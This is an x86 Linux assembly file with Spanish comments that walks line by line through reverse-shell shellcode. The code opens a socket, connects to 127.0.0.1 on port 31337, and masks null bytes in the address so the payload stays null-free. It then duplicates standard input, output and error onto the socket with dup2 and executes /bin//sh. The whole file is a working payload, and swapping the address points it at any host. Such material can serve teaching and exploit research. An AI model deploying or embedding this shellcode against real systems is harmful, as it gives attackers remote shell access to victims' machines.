BITS 32
section .text
global _start
_start:

; syscall socketcall(ebx, ecx) donde ebx = numero funcion y ecx = direccion de parametros de funcion

; s = socket(2, 1, 0);
push byte 0x66          ; Llamada al sistema 102, socketcall().
pop eax                 ; En eax almacenamos el numero 102.
cdq                     ; Ponemos a cero el registro edx.
xor ebx, ebx            ; Ponemos a cero el registro ebx.
; Construimos los argumentos de la llamada a socket() y los empilamos en orden inverso
inc ebx                 ; Dentro de socketcall(), la llamada socket es la numero uno.
push edx                ; Empilamos el tercer parametro, protocol = 0.
push byte 0x1           ; Empilamos el segundo parametro, SOCK_STREAM = 1.
push byte 0x2           ; Empilamos el primer parametro, AF_INET = 2
mov ecx, esp            ; En ecx almacenamos la direccion donde estan ubicados los parametros.
int 0x80                ; Syscall socketcall() con la funcion socket().

xchg esi, eax           ; Se guarda el descriptor obtenido en esi para usarlo despues.

; connect(s, [2, 31337, <IP>], 16);
push byte 0x66          ; Llamada al sistema 102, socketcall().
pop eax                 ; En eax se almacena el numero 102.
inc ebx                 ; Ebx = 2 para utilizarlo como la constante AF_INET.
; Se construyen los argumentos de la llamada connect() y se empilan en orden inverso.
; Se empila la direccion IP. Las 'b' sustituyen a bytes nulos que se modificaran en tiempo de ejecucion.
push dword 0x01bbbb7f   ; Se impila la direccion IP. 7f = 127, 01 = 1, bb = 187. Tercer parametro.
xor ecx, ecx            ; Se pone a cero el registro ecx.
mov word [esp+1], cx    ; Se sustituyen las 'b' de la IP por ceros. IP = 127.0.0.1.
push word 0x697a        ; Se empila el puerto 31337. 7a69h = 31337d. Segundo parametro.
push word bx            ; Se empila el primer parametro de la estructura. AF_INET = 2 = Ebx.
mov ecx, esp            ; En ecx se almacena la direccion de la estructura.
push byte 16            ; Se empila el tercer parametro de la funcion connect().
push ecx                ; Se empila la direccion de la estructura construida como segundo parametro.
push esi                ; Se empila el primer parametro. El descriptor obtenido por socket().
mov ecx, esp            ; En ecx se almacena la direccion de todos los params de la funcion connect().
inc ebx                 ; Dentro de socketcall(), la llamada connect() es la tercera.
int 80h                 ; Syscall socketcall() con la funcion connect().

;xchg eax, ebx          ; En eax se almacena un tres y en ebx el descriptor devuelto por connect().
mov ebx, esi
; dup2(descriptor aceptado, descriptores I/O estandar);
push byte 0x2           ; Maximo descriptor estandar almacenado en ecx.
pop ecx
dup_l00p:               ; Etiqueta para el bucle.
mov byte al, 0x3F       ; Llamada al sistema 63. Se debe poner dentro del bucle.
                        ; Eax se sobreescribe con el valor de retorno de dup2().
int 80h                 ; Syscall dup2().
dec ecx                 ; Se Decrementa el descriptor estandar hasta que sea cero.
jns dup_l00p            ; Se salta a la etiqueta hasta que el flag de signo sea uno = ecx negativo.

; execve(const char * file, char * const argv[], char * const envp[]);
xor eax, eax
mov byte al, 11
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push edx
mov edx, esp
push ebx
mov ecx, esp
int 80h

